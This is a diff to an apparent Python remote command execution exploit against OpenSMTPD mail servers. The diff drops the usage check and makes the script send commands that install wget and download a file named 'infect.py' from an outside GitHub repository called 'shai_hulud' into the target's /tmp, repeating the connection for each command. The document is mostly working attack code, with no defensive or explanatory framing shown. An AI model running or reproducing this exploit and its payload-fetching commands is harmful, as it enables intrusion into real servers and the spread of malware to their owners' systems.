@@ -7,22 +7,18 @@
 
 from socket import *
 import sys
+import base64
+import time
 
-if len(sys.argv) != 4:
-    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
-    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
-    sys.exit(1)
 
 ADDR = sys.argv[1]
 PORT = int(sys.argv[2])
-CMD = ['sudo apt update', 'sudo apt install python3.8']
-
-s = socket(AF_INET, SOCK_STREAM)
-s.connect((ADDR, PORT))
-
+CMD = ['apt-get update -y', 'apt-get install wget -y', 'wget -O infect.py -P /tmp https://raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py -y', 'touch /tmp/x']
 
 for cmdnum in range(len(CMD)):
-    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum) + "/ " + len(CMD))
+    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum) + "/ " + str(len(CMD)))
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((ADDR, PORT))
     res = s.recv(1024)
     if 'OpenSMTPD' not in str(res):
         print('[!] No OpenSMTPD detected')
@@ -58,3 +54,5 @@ for cmdnum in range(len(CMD)):
     s.send(b'QUIT\r\n')
     s.recv(1024)
     print('[*] Done')
+    time.sleep(3)
+
